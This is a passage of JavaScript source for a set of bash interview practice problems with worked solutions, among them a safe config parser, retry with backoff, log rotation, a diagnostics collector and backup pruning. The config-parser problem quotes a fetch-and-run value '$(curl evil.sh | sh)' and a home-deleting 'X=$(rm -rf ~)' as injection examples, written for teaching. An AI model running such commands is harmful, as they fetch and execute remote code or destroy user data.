    s: `<p>Scripts on a shared server load settings from <code>/etc/myjob.conf</code> with <code>source</code>. Someone points out that anyone who can edit that file can run any command as the job's user. Write a function <code>load_config FILE</code> that reads <code>KEY=VALUE</code> lines into an associative array <code>CFG</code>, ignores blank lines and <code># comments</code>, trims spaces around keys and values, strips one pair of surrounding quotes, rejects invalid keys with the line number, and never executes anything from the file.</p>`,
    ex: `<p>File lines <code>BUCKET = "s3://acme-logs"</code>, <code># comment</code>, <code>RETENTION_DAYS=30</code>, <code>bad key=1</code> → <code>CFG[BUCKET]=s3://acme-logs</code>, <code>CFG[RETENTION_DAYS]=30</code>, and ${H.c('r', 'myjob.conf:4: invalid key "bad key"')}. A line like <code>X=$(rm -rf ~)</code> is stored as plain text and never runs.</p>`,
    bw: `<p><code>source /etc/myjob.conf</code> runs the file as bash code. A value such as <code>$(curl evil.sh | sh)</code> executes. It also lets the file overwrite any variable in your script (<code>PATH=</code>), and a typo becomes a syntax error at run time.</p>`,
    bc: B`source /etc/myjob.conf      # executes whatever is in the file`,
    q: ['Which <code>read</code> form keeps everything after the first <code>=</code> as the value?', ['<code>IFS=\'=\' read -r key value</code>', '<code>read key value</code>', '<code>IFS=\'=\' read -a parts</code> and use parts[1]', '<code>cut -d= -f2</code>'], 0, 'With two variable names, read splits on the first = and puts the rest of the line, including any later = signs, into the last variable. parts[1] or cut -f2 would cut a value like a=b=c short.'],
    h: ['<p>Hint 1: <code>while IFS=\'=\' read -r key value || [[ -n $key ]]; do</code> also handles a last line without a newline.</p>', '<p>Hint 2: trim with parameter expansion: <code>key="&#36;{key#&#36;{key%%[![:space:]]*}}"</code> removes leading space; or use <code>[[ $key =~ ^[[:space:]]*(.*[^[:space:]])[[:space:]]*$ ]]</code> and <code>BASH_REMATCH[1]</code>.</p>', '<p>Hint 3: validate keys with <code>^[A-Z_][A-Z0-9_]*$</code>, strip quotes with a regex on <code>^"(.*)"$</code> or <code>^\'(.*)\'$</code>, and declare <code>CFG</code> with <code>declare -gA</code> inside the function.</p>'],
    a: `<p>Read the file line by line with <code>IFS='='</code> so the first <code>=</code> separates key and value. Skip blank and comment lines. Trim both sides with a regex capture. Validate the key against a strict pattern and report the line number on failure. Remove one layer of matching quotes. Store into a global associative array. Values are only ever assigned as data, never evaluated, so the file cannot run code. Return non-zero if any line was invalid so the caller can stop.</p>`,
    code: B`#!/usr/bin/env bash
set -euo pipefail

trim() { local s="$1"; [[ $s =~ ^[[:space:]]*(.*[^[:space:]])[[:space:]]*$ ]] && s="\${BASH_REMATCH[1]}" || s=""; printf '%s' "$s"; }

load_config() {                         # load_config FILE -> fills global CFG, returns 1 on bad lines
  local file="$1" key value n=0 bad=0
  declare -gA CFG=()
  while IFS='=' read -r key value || [[ -n $key ]]; do
    n=$(( n + 1 ))
    key="$(trim "$key")"
    [[ -z $key || $key == \#* ]] && continue          # blank or comment
    if ! [[ $key =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
      echo "\${file##*/}:$n: invalid key \"$key\"" >&2; bad=1; continue
    fi
    value="$(trim "\${value:-}")"
    if [[ $value =~ ^\"(.*)\"$ || $value =~ ^\'(.*)\'$ ]]; then value="\${BASH_REMATCH[1]}"; fi
    CFG[$key]="$value"                                # stored as text, never executed
  done < "$file"
  return "$bad"
}

# Demo
conf="$(mktemp)"
cat > "$conf" <<'EOF'
BUCKET = "s3://acme-logs"
# comment
RETENTION_DAYS=30
bad key=1
X=$(rm -rf ~)
EOF
load_config "$conf" || echo "(config had errors)"
for k in "\${!CFG[@]}"; do printf '%s=%s\n' "$k" "\${CFG[$k]}"; done | sort
rm -f -- "$conf"
# Output:
# tmp.XXXXXX:4: invalid key "bad key"
# (config had errors)
# BUCKET=s3://acme-logs
# RETENTION_DAYS=30
# X=$(rm -rf ~)`,
    cx: `<p>One pass over the file, O(lines). Each <code>$(trim ...)</code> starts a subshell; fine for config files of a few hundred lines.</p>`,
    f: ['Which file permissions should <code>/etc/myjob.conf</code> have, and who should own it?', 'When would you switch the config format to JSON and use jq instead?']
  }));
  practice.push(P({
    t: 'A reusable retry function with backoff and jitter', l: 'Medium', tags: ['functions', 'loops', 'exit codes', 'resilience'], co: ['Amazon', 'Google'],
    s: `<p>Many scripts call flaky things (package mirrors, APIs, <code>aws s3 cp</code>). Write a function <code>retry MAX_ATTEMPTS COMMAND [ARGS...]</code> that runs the command, retries on failure with exponential backoff (1, 2, 4 ... seconds, capped at 30) plus random jitter, logs each failure to stderr with the exit code, returns 0 on the first success, and on giving up returns the <b>command's</b> last exit code (not just 1). Demonstrate it with a command that fails twice and then works.</p>`,
    ex: `<p><code>retry 5 flaky</code> where flaky fails twice: ${H.c('y', 'attempt 1/5 failed (exit 3), retrying in 2s')}, ${H.c('y', 'attempt 2/5 failed (exit 3), retrying in 3s')} (the waits vary a little because of the jitter: 1-2 s, then 2-4 s), then ${H.c('g', 'flaky worked on try 3')}, return 0. <code>retry 2 false</code> → two failures, returns 1.</p>`,
    bw: `<p>Copy-pasting <code>cmd || cmd || cmd</code> retries instantly (the outage is still there a millisecond later) and loses the reason for the failure. An endless <code>until cmd; do :; done</code> hammers the service and never gives up.</p>`,
    bc: B`aws s3 cp f s3://b/ || aws s3 cp f s3://b/ || aws s3 cp f s3://b/   # no wait, no logging`,
    q: ['Why add random jitter to the backoff delay?', ['So many clients retrying the same outage do not hit the service in synchronised waves', 'To make the script slower', 'Because sleep needs a random number', 'To avoid set -e'], 0, 'Without jitter, every client that failed at the same moment retries at the same moments again. Random spread smooths the load and gives the service a chance to recover.'],
    h: ['<p>Hint 1: <code>local max="$1"; shift</code>, then the command is <code>"$@"</code>. Run it as <code>if "$@"; then return 0; fi</code> and capture <code>rc=$?</code> in the else branch.</p>', '<p>Hint 2: delay doubles each round: <code>delay=$(( delay * 2 ))</code>, capped with <code>(( delay &gt; 30 )) &amp;&amp; delay=30</code>. Jitter: <code>$(( RANDOM % (delay + 1) ))</code>.</p>', '<p>Hint 3: for the demo, a flaky command can keep its count in a file (a function in <code>$( )</code> or a child process cannot change parent variables).</p>'],
    a: `<p>The function takes the attempt limit, shifts it off, and runs <code>"$@"</code> so arguments are passed through exactly. It is used inside an <code>if</code>, so <code>set -e</code> does not abort on the expected failures. On failure it stores the code, stops when the limit is reached (returning that code so callers can tell "not found" from "timeout"), and otherwise sleeps for the current delay plus jitter before doubling the delay. The demo uses a counter file so the flaky command can remember how many times it ran.</p>`,
    code: B`#!/usr/bin/env bash
set -euo pipefail

retry() {                                   # retry MAX COMMAND [ARGS...]
  local max="$1" attempt=1 delay=1 rc=0 pause
  shift
  while :; do
    if "$@"; then return 0; else rc=$?; fi
    if (( attempt >= max )); then
      echo "giving up after $attempt attempts: $* (exit $rc)" >&2
      return "$rc"
    fi
    pause=$(( delay + RANDOM % (delay + 1) ))  # backoff plus jitter
    echo "attempt $attempt/$max failed (exit $rc), retrying in \${pause}s" >&2
    sleep "$pause"
    attempt=$(( attempt + 1 ))
    delay=$(( delay * 2 )); (( delay > 30 )) && delay=30
  done
}

# Demo: a command that fails twice with exit 3, then succeeds
counter="$(mktemp)"; echo 0 > "$counter"
flaky() {
  local n; n=$(( $(cat "$counter") + 1 )); echo "$n" > "$counter"
  if (( n < 3 )); then return 3; fi
  echo "flaky worked on try $n"
}
retry 5 flaky
retry 2 false || echo "retry returned $?"
rm -f -- "$counter"`,
    cx: `<p>Worst case waits about 1 + 2 + 4 + ... up to MAX attempts (doubled by jitter at most). The function itself costs nothing.</p>`,
    f: ['Some failures should not be retried (bad credentials, 404). How would you let the caller say which exit codes are retryable?', 'How would you add a total time limit as well as an attempt limit?']
  }));
  practice.push(P({
    t: 'Log rotation without root: logrotate with your own state file', l: 'Medium', tags: ['logrotate', 'cron', 'logs'], co: ['Rackspace', 'Accenture'],
    s: `<p>You run an app as user <code>deploy</code> on a server where you have no sudo. It writes <code>~/app/logs/app.log</code> and <code>~/app/logs/worker.log</code>, which reached 30 GB last month. Set up rotation that runs daily as <code>deploy</code>: keep 10 days, compress, rotate early if a file exceeds 500 MB, do not break the app (it does not reopen its logs), and give a way to test it right now. Provide the config, the cron line, and a test script.</p>`,
    ex: `<p>After a forced test run, <code>ls ~/app/logs</code> shows ${H.c('g', 'app.log (0 bytes, still being written)')} and ${H.c('g', 'app.log.1')}; the next night <code>app.log.1</code> becomes <code>app.log.2.gz</code>. The state file lives in <code>~/app/logrotate.state</code>, not in <code>/var/lib</code>.</p>`,
    bw: `<p>A cron job running <code>&gt; app.log</code> every night throws away all logs. Asking for root to add <code>/etc/logrotate.d/app</code> may not be possible. Running <code>logrotate</code> as a normal user without <code>-s</code> fails, because it cannot write the system state file.</p>`,
    q: ['Why use <code>copytruncate</code> for this app?', ['The app keeps its log file open and never reopens it, so renaming would leave it writing into the rotated file', 'It compresses better', 'It is required for non-root users', 'It deletes old logs'], 0, 'With the default create mode, logrotate renames app.log and the app keeps writing to the renamed file. copytruncate copies the content and empties the original in place, so the app writes on, at the cost of possibly losing a few lines during the copy.'],
    h: ['<p>Hint 1: logrotate runs fine as a normal user if you give it a config it may read and a state file it may write: <code>logrotate -s STATE CONF</code>.</p>', '<p>Hint 2: <code>daily</code> plus <code>maxsize 500M</code> rotates daily or earlier when the file is too big (only checked when logrotate runs, so schedule it hourly).</p>', '<p>Hint 3: test with <code>-d</code> (debug, no changes), then <code>-f</code> (force). Absolute paths in the config: logrotate does not expand <code>~</code> reliably.</p>'],
    a: `<p>Write a user-owned config with absolute paths, <code>daily</code>, <code>maxsize 500M</code>, <code>rotate 10</code>, <code>compress</code> plus <code>delaycompress</code>, <code>missingok</code>, <code>notifempty</code> and <code>copytruncate</code>. Run logrotate from the user's crontab <b>hourly</b> with <code>-s</code> pointing at a state file in the user's home, so the size limit is checked often while daily rotation still happens once a day. The setup script creates the files idempotently and shows how to test: a dry run first, then a forced rotation, then a listing.</p>`,
    code: B`#!/usr/bin/env bash
# setup-user-logrotate.sh - rotation for ~/app/logs without root. Safe to re-run.
set -euo pipefail
APP="$HOME/app"
CONF="$APP/logrotate.conf"
STATE="$APP/logrotate.state"
mkdir -p "$APP/logs"

cat > "$CONF.new" <<EOF
$APP/logs/*.log {
    daily
    maxsize 500M
    rotate 10
    compress
    delaycompress
    missingok
    notifempty
    copytruncate
}
EOF
if cmp -s -- "$CONF.new" "$CONF"; then rm -f -- "$CONF.new"; else mv -f -- "$CONF.new" "$CONF"; echo "wrote $CONF"; fi

# Hourly cron entry, added only once (idempotent)
line="17 * * * * /usr/sbin/logrotate -s $STATE $CONF >> $APP/logrotate.log 2>&1"
if ! crontab -l 2>/dev/null | grep -qxF -- "$line"; then
  { crontab -l 2>/dev/null || true; echo "$line"; } | crontab -
  echo "added cron entry"
fi

# Test now
/usr/sbin/logrotate -d -s "$STATE" "$CONF"       # dry run: prints the plan, changes nothing
/usr/sbin/logrotate -f -s "$STATE" "$CONF"       # force a rotation
ls -l "$APP/logs"`,
    cx: `<p>An hourly logrotate run takes milliseconds when nothing needs rotating. Compression of a 500 MB log takes a few seconds of one CPU.</p>`,
    f: ['What is lost with copytruncate, and how would you avoid it if you could change the app?', 'How would you ship these logs off the server before they are deleted?']
  }));
  practice.push(P({
    t: 'Check a list of URLs and produce a status report', l: 'Medium', tags: ['while read', 'curl', 'reports'], co: ['Datadog', 'Cloudflare'],
    s: `<p>Before and after a DNS or certificate change, you want a quick report on 20 endpoints. Write <code>check-urls.sh FILE</code>: FILE has one URL per line, blank lines and <code>#</code> comments allowed, and the last line may have no newline. For each URL print the HTTP status, total time and OK/FAIL (2xx and 3xx are OK), and exit 1 if any failed. A URL that cannot be reached at all must show its curl error code instead of a status.</p>`,
    ex: `<p>Output: ${H.c('g', 'OK    200  0.142s  https://www.example.com/')}, ${H.c('r', 'FAIL  503  0.051s  https://api.example.com/health')}, ${H.c('r', 'FAIL  curl:6  -  https://old.example.com/')} (DNS failure), then <code>2/3 failed</code>, exit 1.</p>`,
    bw: `<p><code>for u in $(cat urls.txt); do curl $u; done</code> dumps whole pages to the screen, treats comment words as URLs, hangs for minutes on an unreachable host (no timeout), and gives no summary or exit code.</p>`,
    bc: B`for u in $(cat urls.txt); do curl $u; done`,
    q: ['Which curl options give you the status code and time without the page body?', ['<code>-s -o /dev/null -w \'%{http_code} %{time_total}\'</code>', '<code>-I</code> only', '<code>-v</code>', '<code>--fail</code> only'], 0, '-o /dev/null discards the body, -s hides the progress bar, and -w prints chosen variables after the transfer. -I sends HEAD, which some servers answer differently from GET.'],
    h: ['<p>Hint 1: <code>while IFS= read -r url || [[ -n $url ]]; do</code>, then skip blanks and comments with a regex like <code>^[[:space:]]*(#|$)</code>.</p>', '<p>Hint 2: <code>out="$(curl -s -o /dev/null --max-time 10 -w \'%{http_code} %{time_total}\' "$url")" || rc=$?</code>. On a connection failure, curl exits non-zero and the status is 000.</p>', '<p>Hint 3: use <code>printf \'%-5s %-7s %-7s %s\\n\'</code> for aligned columns, and count failures for the summary and exit code.</p>'],
    a: `<p>Read the file with a <code>while read</code> loop that also handles a missing final newline, skipping blank and comment lines. For each URL, call curl with a timeout, no body and a <code>-w</code> format, capturing both its output and its exit code. A non-zero curl code means no HTTP answer at all, so report <code>curl:CODE</code>; otherwise classify the status by its first digit. Print aligned columns, count failures, print a summary and exit 1 if any failed, so this can gate a change in CI.</p>`,
    code: B`#!/usr/bin/env bash
# check-urls.sh FILE  -> report per URL, exit 1 if any failed
set -uo pipefail
file="\${1:?usage: check-urls.sh FILE}"
[[ -r $file ]] || { echo "cannot read $file" >&2; exit 2; }

total=0 failed=0
while IFS= read -r url || [[ -n $url ]]; do
  [[ $url =~ ^[[:space:]]*(#|$) ]] && continue
  total=$(( total + 1 ))
  rc=0
  out="$(curl -s -o /dev/null --max-time 10 -w '%{http_code} %{time_total}' "$url")" || rc=$?
  read -r code secs <<< "$out"
  if (( rc != 0 )); then
    printf '%-5s %-8s %-8s %s\n' FAIL "curl:$rc" "-" "$url"; failed=$(( failed + 1 ))
  elif [[ $code == 2?? || $code == 3?? ]]; then
    printf '%-5s %-8s %-8s %s\n' OK "$code" "\${secs}s" "$url"
  else
    printf '%-5s %-8s %-8s %s\n' FAIL "$code" "\${secs}s" "$url"; failed=$(( failed + 1 ))
  fi
done < "$file"

echo "$failed/$total failed"
(( failed == 0 ))`,
    cx: `<p>Sequential: at most about 10 s per URL in the worst case. For hundreds of URLs, run them in parallel with <code>xargs -P</code>.</p>`,
    f: ['How would you also report how many days are left on each TLS certificate?', 'How would you run the checks in parallel but keep the output in the original order?']
  }));
  practice.push(P({
    t: 'Collect a diagnostics bundle for a support ticket', l: 'Medium', tags: ['trap', 'mktemp', 'tar', 'redaction'], co: ['AWS Support', 'Elastic'],
    s: `<p>Support engineers keep asking customers for the same 10 command outputs. Write <code>collect-diag.sh</code> that gathers system information (OS, uptime, disk, memory, top processes, listening ports, failed units, the last 200 journal error lines, and a copy of <code>/etc/myapp/*.conf</code>) into one <code>diag-HOST-TIMESTAMP.tar.gz</code> in the current folder. Missing commands must not stop the script. Config copies must have secrets <b>redacted</b> (values of keys containing password, secret, token or key). Temp files must be cleaned up even on Ctrl+C.</p>`,
    ex: `<p>Run: ${H.c('g', 'wrote diag-web1-20260302T101500Z.tar.gz (48K, 11 files)')}. Inside, <code>conf/app.conf</code> contains <code>db_password = ***REDACTED***</code>. On a box without <code>ss</code>, <code>ports.txt</code> contains <code>command not available: ss</code> and the script carries on.</p>`,
    bw: `<p>Asking the customer to paste outputs into the ticket one by one: slow, often incomplete, and they paste config files with database passwords in them. A quick script without a trap leaves a temp folder full of system details in <code>/tmp</code> when interrupted.</p>`,
    q: ['Why must the redaction happen <b>before</b> the files leave the server?', ['Once a secret is in a ticket, an email or a chat it is copied to many systems and must be rotated', 'Redacting afterwards is slower', 'tar cannot include secrets', 'Support tools strip them automatically'], 0, 'A secret that left the machine is compromised: you cannot recall every copy. Redacting at the source means the bundle is safe to attach anywhere.'],
    h: ['<p>Hint 1: <code>tmp="$(mktemp -d)"; trap \'rm -rf -- "$tmp"\' EXIT</code> on the next line. Build everything inside <code>$tmp/diag</code>.</p>', '<p>Hint 2: a helper <code>capture NAME CMD...</code> that runs the command into <code>$tmp/diag/NAME.txt</code>, writes "command not available" when <code>command -v</code> fails, and never fails itself.</p>', '<p>Hint 3: redact with sed: <code>sed -E \'s/^([[:space:]]*[^=:#]*(password|secret|token|key)[^=:]*[=:]).*/\\1 ***REDACTED***/I\'</code>. Then <code>tar -czf</code> with <code>-C</code> so paths inside the archive are relative.</p>'],
    a: `<p>Create a private temp folder with an EXIT trap so nothing is left behind on any exit, including Ctrl+C. A <code>capture</code> helper runs each diagnostic command into its own file, records "command not available" for missing tools and never stops the script (this is a "collect what you can" job, so it uses <code>set -u</code> and <code>pipefail</code> but not <code>-e</code>). Config files are copied through a case-insensitive sed that replaces the value of any key mentioning password, secret, token or key. Finally, tar the folder with relative paths into a file named after the host and a UTC timestamp, and print its size and file count.</p>`,
    code: B`#!/usr/bin/env bash
# collect-diag.sh - gather a redacted diagnostics bundle into the current folder
set -uo pipefail

host="$(hostname -s)"
stamp="$(date -u +%Y%m%dT%H%M%SZ)"
out="$PWD/diag-$host-$stamp.tar.gz"
tmp="$(mktemp -d)"
trap 'rm -rf -- "$tmp"' EXIT
mkdir -p "$tmp/diag/conf"

capture() {                              # capture NAME COMMAND [ARGS...]
  local name="$1"; shift
  if ! command -v "$1" > /dev/null 2>&1; then
    echo "command not available: $1" > "$tmp/diag/$name.txt"; return 0
  fi
  { echo "\$ $*"; "$@"; } > "$tmp/diag/$name.txt" 2>&1 || echo "(exit $?)" >> "$tmp/diag/$name.txt"
}

capture os        cat /etc/os-release
capture uptime    uptime
capture disk      df -hT
capture memory    free -m
capture processes ps -eo pid,user,%cpu,%mem,etime,cmd --sort=-%cpu
capture ports     ss -ltnp
capture failed    systemctl --failed --no-pager
capture journal   journalctl -p err -n 200 --no-pager

shopt -s nullglob
for f in /etc/myapp/*.conf; do
  sed -E 's/^([[:space:]]*[^=:#]*(password|secret|token|key)[^=:]*[=:]).*/\1 ***REDACTED***/I' \
    "$f" > "$tmp/diag/conf/\${f##*/}"
done

tar -czf "$out" -C "$tmp" diag
echo "wrote \${out##*/} ($(du -h "$out" | cut -f1), $(find "$tmp/diag" -type f | wc -l) files)"`,
    cx: `<p>A few seconds, dominated by journalctl and ps. The bundle is usually tens of kilobytes.</p>`,
    f: ['What else could leak in a diagnostics bundle besides config passwords (think environment variables in ps output, IPs, customer data in logs)?', 'How would you let the customer review the bundle before sending it?']
  }));

  // ───────────────────────── Practice: Hard ─────────────────────────
  practice.push(P({
    t: 'Backup retention: 7 daily, 4 weekly, 6 monthly', l: 'Hard', tags: ['dates', 'associative arrays', 'retention', 'dry-run'], co: ['Veeam', 'Amazon'],
    s: `<p>A folder holds one backup per day named <code>db-YYYY-MM-DD.sql.gz</code>, going back two years, and the disk is filling. Write <code>prune-backups.sh [--apply] DIR</code> that keeps the newest backup of each of the last <b>7 days</b> that have backups, the newest backup in each of the last <b>4 ISO weeks</b>, and the newest backup in each of the last <b>6 months</b> (a "grandfather-father-son" scheme). Everything else is deleted, but only with <code>--apply</code>; without it, the script prints the plan. Files that do not match the name pattern must never be touched.</p>`,
    ex: `<p>With 200 daily backups ending 2026-03-02, the plan keeps 2026-02-24 to 2026-03-02 (daily; these already cover ISO weeks W09 and W10 and the months 2026-02 and 2026-03), then 2026-02-22 (W08) and 2026-02-15 (W07) as weekly, and 2026-01-31, 2025-12-31, 2025-11-30 and 2025-10-31 as monthly: ${H.c('g', '13 kept')}, ${H.c('r', '187 to delete')}. A file called <code>notes.txt</code> is listed as ${H.c('y', 'ignored')}.</p>`,
    bw: `<p><code>find DIR -mtime +30 -delete</code> keeps only one month, so a corruption noticed after five weeks has no clean backup left. Keeping "every 7th file" breaks the first time a day is missing. And modification times change when files are copied or restored, so dates must come from the file name.</p>`,
    bc: B`find /backup -name 'db-*.sql.gz' -mtime +30 -delete    # one month of history, nothing older`,
    q: ['Why take the date from the file name instead of the modification time?', ['Copies, restores and rsync can change mtime, but the name records when the backup was made', 'mtime is not available in bash', 'Names sort faster', 'find cannot read mtime'], 0, 'The name is the stable record of the backup date. mtime is a property of this copy of the file and moves whenever a tool rewrites it without preserving times.'],
    h: ['<p>Hint 1: list matching files with a glob, extract the date with <code>[[ $f =~ db-([0-9]{4}-[0-9]{2}-[0-9]{2})\\.sql\\.gz$ ]]</code>, and sort the dates newest first.</p>', '<p>Hint 2: the week key is <code>date -d "$d" +%G-W%V</code> (ISO year and week), the month key is <code>&#36;{d:0:7}</code>. Walk the sorted list once: a file is kept if fewer than 7 daily slots are used, or its week has not been seen and fewer than 4 weeks are kept, or likewise for months.</p>', '<p>Hint 3: use associative arrays <code>seen_week</code> and <code>seen_month</code>. Mark a week or month as seen when <b>any</b> kept file belongs to it, so a daily keep also covers its week. Print KEEP and DELETE lines with the reason; delete only with <code>--apply</code>.</p>'],
    a: `<p>Collect only files that match the strict name pattern, extract their dates, and sort newest first. One pass assigns each file to the first rule that wants it: daily (first 7), weekly (first file seen in each new ISO week, up to 4 weeks), monthly (first file seen in each new month, up to 6). The week and month of every kept file are recorded so later, older files in the same period are not kept twice. The plan is printed with the reason for each decision. Deletion happens only with <code>--apply</code>, uses <code>rm --</code> on validated names, and is preceded by a check that at least one file is kept, so a bug can never delete everything.</p>`,
    code: B`#!/usr/bin/env bash
# prune-backups.sh [--apply] DIR  - keep 7 daily, 4 weekly, 6 monthly backups (db-YYYY-MM-DD.sql.gz)
set -euo pipefail
shopt -s nullglob
apply=0
if [[ \${1:-} == --apply ]]; then apply=1; shift; fi
dir="\${1:?usage: prune-backups.sh [--apply] DIR}"
[[ -d $dir ]] || { echo "not a directory: $dir" >&2; exit 2; }
DAILY=7 WEEKLY=4 MONTHLY=6

declare -A file_of=()
for f in "$dir"/*; do
  if [[ \${f##*/} =~ ^db-([0-9]{4}-[0-9]{2}-[0-9]{2})\.sql\.gz$ ]]; then
    file_of[\${BASH_REMATCH[1]}]="$f"
  else
    echo "ignored: \${f##*/}"
  fi
done
(( \${#file_of[@]} > 0 )) || { echo "no backups found"; exit 0; }
mapfile -t dates < <(printf '%s\n' "\${!file_of[@]}" | sort -r)

declare -A seen_week=() seen_month=()
days=0 weeks=0 months=0 kept=0
to_delete=()
for d in "\${dates[@]}"; do
  week="$(date -d "$d" +%G-W%V)"; month="\${d:0:7}"; why=""
  if (( days < DAILY )); then why="daily"; days=$(( days + 1 ))
  elif [[ -z \${seen_week[$week]:-} ]] && (( weeks < WEEKLY )); then why="weekly $week"
  elif [[ -z \${seen_month[$month]:-} ]] && (( months < MONTHLY )); then why="monthly $month"
  fi
  if [[ -n $why ]]; then
    [[ -z \${seen_week[$week]:-} ]]   && { seen_week[$week]=1;   weeks=$(( weeks + 1 )); }
    [[ -z \${seen_month[$month]:-} ]] && { seen_month[$month]=1; months=$(( months + 1 )); }
    echo "KEEP   $d ($why)"; kept=$(( kept + 1 ))
  else
    to_delete+=("\${file_of[$d]}")
  fi
done

echo "plan: keep $kept, delete \${#to_delete[@]}"
(( kept > 0 )) || { echo "refusing: nothing would be kept" >&2; exit 1; }
if (( ! apply )); then echo "dry run (use --apply to delete)"; exit 0; fi
for f in "\${to_delete[@]}"; do rm -f -- "$f"; done
echo "deleted \${#to_delete[@]} backups"`,
    cx: `<p>One <code>date</code> call per backup and a sort: O(n log n) for n backups, well under a second for a few thousand files.</p>`,
    f: ['How would you apply the same policy to objects in an S3 bucket, and why might S3 lifecycle rules be the better tool?', 'What test would you write to prove the script never deletes the newest backup?']
  }));
  practice.push(P({
    t: 'An idempotent server bootstrap script', l: 'Hard', tags: ['idempotency', 'systemd', 'apt', 'provisioning'], co: ['DigitalOcean', 'Canonical'],
    s: `<p>New Ubuntu VMs are prepared by hand from a wiki page. Write <code>bootstrap.sh</code> (run as root) that brings a VM into this state, and prints <code>0 changes</code> when run a second time:</p>
<ul><li>packages <code>nginx</code>, <code>jq</code> and <code>logrotate</code> installed (run <code>apt-get update</code> only when something must be installed);</li>
<li>a system user <code>app</code> with no login shell, and <code>/srv/app</code> owned by it with mode 750;</li>
<li><code>/etc/sysctl.d/90-app.conf</code> with given content, applied only when changed;</li>
<li>a systemd unit <code>/etc/systemd/system/app.service</code>; <code>daemon-reload</code> and restart only when the unit changed; enabled and running.</li></ul>`,
    constraints: 'Test in a disposable VM or a systemd-enabled container (for example a Multipass or Vagrant VM). Never on a server you care about. Root required.',
    ex: `<p>First run: ${H.c('y', 'installed packages: nginx jq')}, ${H.c('y', 'created user app')}, ${H.c('y', 'updated /etc/sysctl.d/90-app.conf')}, ${H.c('y', 'updated /etc/systemd/system/app.service')}, ..., ${H.c('g', '6 changes')}. Second run: ${H.c('g', '0 changes')}, no restart, no apt update.</p>`,
    bw: `<p>A list of commands copied from the wiki: <code>apt-get update &amp;&amp; apt-get install -y ...; useradd app; echo ... &gt;&gt; /etc/sysctl.conf; systemctl restart app</code>. The second run fails at <code>useradd</code> (and with set -e stops there), appends duplicate sysctl lines, and restarts the app every time.</p>`,
    bc: B`apt-get update && apt-get install -y nginx jq logrotate
useradd app                                   # fails on the second run
echo "vm.swappiness = 10" >> /etc/sysctl.conf # duplicates on every run
systemctl restart app                         # restarts even when nothing changed`,
    q: ['How do you install packages only when they are missing, without parsing <code>apt list</code> output?', ['Check each with <code>dpkg-query -W -f=\'&#36;{Status}\' PKG</code> for "install ok installed"', 'Run <code>apt-get install</code> every time and ignore errors', 'Check whether <code>/usr/bin/PKG</code> exists', '<code>which PKG</code>'], 0, 'dpkg-query reads the package database directly and gives a stable answer. Package names often differ from binary names, so checking /usr/bin or which is unreliable.'],
    h: ['<p>Hint 1: keep a global <code>changes=0</code> counter; every helper increments it only when it really changed something, and prints what it did.</p>', '<p>Hint 2: <code>ensure_file DEST MODE</code> reads the wanted content from stdin into a temp file, compares with <code>cmp -s</code>, and returns 0 if it changed something, 1 if not, so callers can write <code>if ensure_file ...; then systemctl daemon-reload; fi</code>.</p>', '<p>Hint 3: <code>id -u app &amp;&gt;/dev/null || useradd --system --shell /usr/sbin/nologin --home-dir /srv/app app</code>; <code>install -d -o app -g app -m 750 /srv/app</code> is idempotent too, but compare <code>stat -c \'%U:%G %a\'</code> first if you want an accurate change count.</p>'],
    a: `<p>Every step is written as "check, then act only if needed", and reports a change only when it made one. Packages: query dpkg for each, collect the missing ones, and only then run <code>apt-get update</code> and install. User: create with <code>useradd --system</code> only if <code>id</code> fails. Folder: compare owner, group and mode with <code>stat</code>, and fix with <code>install -d</code> when different. Files: <code>ensure_file</code> compares the desired content with the current file and replaces atomically when they differ, and its return code drives the follow-up actions (apply sysctl, daemon-reload plus restart). The service is enabled and started only if it is not already. The final line prints the change count, so "run it twice, expect 0 changes" becomes the test.</p>`,
    code: B`#!/usr/bin/env bash
# bootstrap.sh - bring an Ubuntu VM to the desired state; safe to run any number of times
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root" >&2; exit 1; }
export DEBIAN_FRONTEND=noninteractive
changes=0
note() { echo "$*"; changes=$(( changes + 1 )); }

ensure_packages() {
  local p missing=()
  for p in "$@"; do
    dpkg-query -W -f='\${Status}' "$p" 2>/dev/null | grep -q 'install ok installed' || missing+=("$p")
  done
  (( \${#missing[@]} == 0 )) && return 0
  apt-get update -qq
  apt-get install -y -qq "\${missing[@]}"
  note "installed packages: \${missing[*]}"
}

ensure_file() {                      # ensure_file DEST MODE < content ; returns 0 if changed
  local dest="$1" mode="$2" tmp
  tmp="$(mktemp "$(dirname "$dest")/.bootstrap.XXXXXX")"
  cat > "$tmp"
  if [[ -f $dest ]] && cmp -s -- "$tmp" "$dest" && [[ $(stat -c %a "$dest") == "\${mode#0}" ]]; then
    rm -f -- "$tmp"; return 1
  fi
  chmod "$mode" -- "$tmp"
  mv -f -- "$tmp" "$dest"
  note "updated $dest"
}

# 1. Packages
ensure_packages nginx jq logrotate

# 2. User and folder
if ! id -u app > /dev/null 2>&1; then
  useradd --system --shell /usr/sbin/nologin --home-dir /srv/app --no-create-home app
  note "created user app"
fi
if [[ ! -d /srv/app || $(stat -c '%U:%G %a' /srv/app) != "app:app 750" ]]; then
  install -d -o app -g app -m 750 /srv/app
  note "fixed /srv/app ownership and mode"
fi

# 3. Kernel settings, applied only when the file changed
if ensure_file /etc/sysctl.d/90-app.conf 0644 <<'EOF'
net.core.somaxconn = 4096
vm.swappiness = 10
EOF
then
  sysctl --quiet --load /etc/sysctl.d/90-app.conf
fi

# 4. Service unit: reload and restart only when it changed
if ensure_file /etc/systemd/system/app.service 0644 <<'EOF'
[Unit]
Description=Example app
After=network-online.target

[Service]
User=app
WorkingDirectory=/srv/app
ExecStart=/usr/bin/python3 -m http.server 8080 --bind 127.0.0.1
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
then
  systemctl daemon-reload
  systemctl restart app
fi
if ! systemctl is-enabled --quiet app; then systemctl enable --quiet app; note "enabled app"; fi
if ! systemctl is-active  --quiet app; then systemctl start app;          note "started app"; fi

echo "$changes changes"`,
    cx: `<p>A second run costs a few <code>dpkg-query</code>, <code>stat</code> and <code>cmp</code> calls: about a second. The first run is dominated by <code>apt-get</code>.</p>`,
    f: ['This script is a small version of what Ansible does. Which Ansible modules map to each step, and what does <code>--check</code> mode add?', 'How would you remove a setting that an older version of the script added?']
  }));
  practice.push(P({
    t: 'Rolling restart across servers with health checks', l: 'Hard', tags: ['ssh', 'loops', 'health checks', 'safety'], co: ['Netflix', 'Booking.com'],
